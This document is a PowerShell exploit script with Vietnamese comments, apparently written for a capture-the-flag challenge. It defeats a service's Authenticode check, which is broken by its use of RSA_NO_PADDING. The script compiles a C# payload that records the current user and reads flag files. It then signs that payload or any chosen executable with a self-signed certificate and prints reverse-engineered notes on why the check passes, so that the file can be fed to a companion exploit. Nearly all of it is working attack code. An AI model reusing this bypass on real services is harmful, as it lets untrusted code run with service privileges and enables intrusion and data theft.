# sign_bypass.ps1
# Exploit: sub_462330 @ 0x462330 dung RSA_NO_PADDING (push 3 @ 0x462448)
# -> RSA_public_decrypt khong validate padding -> luon tra ve duong -> PASS
# Dieu kien: exe phai co Authenticode sig, EncryptedHash.cbData <= 512 bytes
# RSA2048 = 256 bytes, RSA4096 = 512 bytes -> deu pass

param(
    [string]$TargetExe  = "",
    [string]$Subject    = "CN=TopSecBypass,O=CTF,C=VN",
    [int]   $KeyLength  = 2048,   # RSA2048 -> 256 bytes <= 512 -> PASS
    [switch]$CreatePayload        # them flag nay de tu tao payload.exe
)

$ErrorActionPreference = "Stop"

function Write-Step($n, $msg) { Write-Host "[$n] $msg" -ForegroundColor Yellow }
function Write-Ok($msg)        { Write-Host "    [+] $msg" -ForegroundColor Green  }
function Write-Err($msg)       { Write-Host "    [-] $msg" -ForegroundColor Red    }
function Write-Info($msg)      { Write-Host "    [*] $msg" -ForegroundColor Cyan   }

Write-Host ""
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "  sv_service Authenticode Bypass  (sub_462330 @ 0x462330)" -ForegroundColor Cyan
Write-Host "  Bug: RSA_NO_PADDING (push 3 @ 0x462448) -> always PASS" -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host ""

# ── Buoc 0: tuy chon tao payload exe ─────────────────────────────────────
if ($CreatePayload) {
    Write-Step 0 "Tao payload.exe (in whoami + doc flag)"

    $src = @'
using System;
using System.IO;
using System.Diagnostics;
using System.Security.Principal;

class Payload {
    static void Main(string[] args) {
        string log = @"C:\Windows\Temp\sv_payload_out.txt";
        try {
            string user  = WindowsIdentity.GetCurrent().Name;
            string pid   = Process.GetCurrentProcess().Id.ToString();
            string lines = "=== sv_service payload ===\r\n"
                         + "user=" + user + "\r\n"
                         + "pid="  + pid  + "\r\n";

            // Thu doc flag
            string[] paths = {
                @"C:\flag.txt", @"C:\flag",
                @"C:\Users\Administrator\Desktop\flag.txt",
                @"C:\Users\kuvee\Desktop\flag.txt",
                @"C:\Windows\flag.txt"
            };
            foreach (var p in paths) {
                if (File.Exists(p)) {
                    lines += "FLAG_FILE=" + p + "\r\n";
                    lines += "FLAG=" + File.ReadAllText(p) + "\r\n";
                    break;
                }
            }
            File.WriteAllText(log, lines);
        } catch (Exception e) {
            File.WriteAllText(log, "ERROR: " + e.Message);
        }
    }
}
'@

    $payloadPath = "E:\temp\payload.exe"
    Add-Type -TypeDefinition $src -Language CSharp `
             -OutputAssembly $payloadPath -OutputType ConsoleApplication
    Write-Ok "Tao xong: $payloadPath"
    if ($TargetExe -eq "") { $TargetExe = $payloadPath }
}

# ── Buoc 1: tao hoac lay lai cert ─────────────────────────────────────────
Write-Step 1 "Tao self-signed code signing certificate (RSA$KeyLength)..."

# Kiem tra xem cert cu con khong
$existing = Get-ChildItem Cert:\CurrentUser\My |
            Where-Object { $_.Subject -eq $Subject -and
                           $_.NotAfter -gt (Get-Date) } |
            Select-Object -First 1

if ($existing) {
    $cert = $existing
    Write-Ok "Dung lai cert cu: $($cert.Thumbprint)"
} else {
    $cert = New-SelfSignedCertificate `
        -Type          CodeSigningCert `
        -Subject       $Subject `
        -KeyAlgorithm  RSA `
        -KeyLength     $KeyLength `
        -HashAlgorithm SHA256 `
        -CertStoreLocation "Cert:\CurrentUser\My" `
        -NotAfter      (Get-Date).AddYears(5)
    Write-Ok "Da tao cert moi"
}

$encHashBytes = $KeyLength / 8
Write-Ok "Thumbprint : $($cert.Thumbprint)"
Write-Ok "Subject    : $($cert.Subject)"
Write-Ok "RSA$KeyLength -> EncryptedHash = $encHashBytes bytes (can <= 512) -> PASS"

# ── Buoc 2: chon target exe ───────────────────────────────────────────────
Write-Step 2 "Chon file can ky..."

if ($TargetExe -eq "") {
    Write-Host ""
    Write-Host "    Chua co -TargetExe. Goi y:" -ForegroundColor Gray
    Write-Host "    1) E:\temp\payload.exe   (tu tao bang -CreatePayload)" -ForegroundColor Gray
    Write-Host "    2) C:\Windows\System32\cmd.exe (da co sig Microsoft, khong can ky them)" -ForegroundColor Gray
    Write-Host "    3) Bat ky exe nao khac" -ForegroundColor Gray
    Write-Host ""
    $TargetExe = Read-Host "    Nhap duong dan exe"
}

if (-not (Test-Path $TargetExe)) {
    Write-Err "Khong tim thay: $TargetExe"; exit 1
}

# Neu la system exe (da co sig Microsoft), khong can ky lai
$existingSig = Get-AuthenticodeSignature -FilePath $TargetExe
if ($existingSig.Status -eq "Valid") {
    $ekSize = $existingSig.SignerCertificate.PublicKey.Key.KeySize / 8
    Write-Ok "File nay DA co chu ky hop le: $($existingSig.SignerCertificate.Subject)"
    Write-Ok "EncryptedHash size: $ekSize bytes"
    if ($ekSize -le 512) {
        Write-Ok "BYPASS OK: khong can ky lai!"
        Write-Host ""
        Write-Host "[!] Ket luan: dung truc tiep file nay voi cmd 0x01/0x03" -ForegroundColor Green
        Write-Host "    Path: $TargetExe" -ForegroundColor Green
    } else {
        Write-Err "EncryptedHash qua lon ($ekSize > 512), phai ky lai bang RSA <= 4096"
    }
}

# ── Buoc 3: ky file ───────────────────────────────────────────────────────
Write-Step 3 "Ky: $TargetExe"

# Thu ky voi timestamp (co the timeout neu khong co mang)
$result = $null
try {
    $result = Set-AuthenticodeSignature `
        -FilePath        $TargetExe `
        -Certificate     $cert `
        -HashAlgorithm   SHA256 `
        -TimestampServer "http://timestamp.digicert.com"
    Write-Info "Da ky co timestamp"
} catch {
    Write-Info "Timestamp server loi, ky khong co timestamp..."
    $result = Set-AuthenticodeSignature `
        -FilePath      $TargetExe `
        -Certificate   $cert `
        -HashAlgorithm SHA256
}

Write-Ok "Ky xong, status: $($result.Status)"

# ── Buoc 4: xac minh ──────────────────────────────────────────────────────
Write-Step 4 "Xac minh chu ky..."

$sig     = Get-AuthenticodeSignature -FilePath $TargetExe
$keyBits = $sig.SignerCertificate.PublicKey.Key.KeySize
$ekBytes = $keyBits / 8

Write-Host ""
Write-Host "    Authenticode status : $($sig.Status)"
Write-Host "    Signer cert subject : $($sig.SignerCertificate.Subject)"
Write-Host "    Signer key size     : RSA$keyBits"
Write-Host "    EncryptedHash size  : $ekBytes bytes"
Write-Host ""

if ($ekBytes -le 512) {
    Write-Host "    BYPASS ANALYSIS:" -ForegroundColor Cyan
    Write-Host "      sub_462330 @ 0x462330:" -ForegroundColor Cyan
    Write-Host "        RSA_public_decrypt(cbData=$ekBytes, pbData, outbuf," -ForegroundColor Cyan
    Write-Host "                           DigiCert_CA_key, RSA_NO_PADDING=3)" -ForegroundColor Cyan
    Write-Host "        cbData ($ekBytes) <= RSA_size(CA=RSA4096=512) -> tinh toan duoc" -ForegroundColor Cyan
    Write-Host "        RSA_NO_PADDING -> khong check padding -> tra ve +512, khong phai -1" -ForegroundColor Cyan
    Write-Host "        sub_4023A0 != -1 -> sub_462330 returns 0 -> PASS!" -ForegroundColor Green
    Write-Host "        sub_462490 @ 0x462490: !0 = TRUE -> v1=1 -> returns 1 -> ALLOWED" -ForegroundColor Green
    Write-Host ""
    Write-Ok "FILE SAN SANG! Dung lam argument cho cmd 0x01/0x03:"
    Write-Host "    $TargetExe" -ForegroundColor White
} else {
    Write-Err "EncryptedHash ($ekBytes bytes) > 512 -> se FAIL. Ky lai bang RSA2048 hoac RSA4096."
}

Write-Host ""
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "  Cach dung voi sv_exploit.py:" -ForegroundColor Cyan
Write-Host "    Chon menu option cho cmd 0x01/0x03" -ForegroundColor Cyan
Write-Host "    Nhap path: $TargetExe" -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan
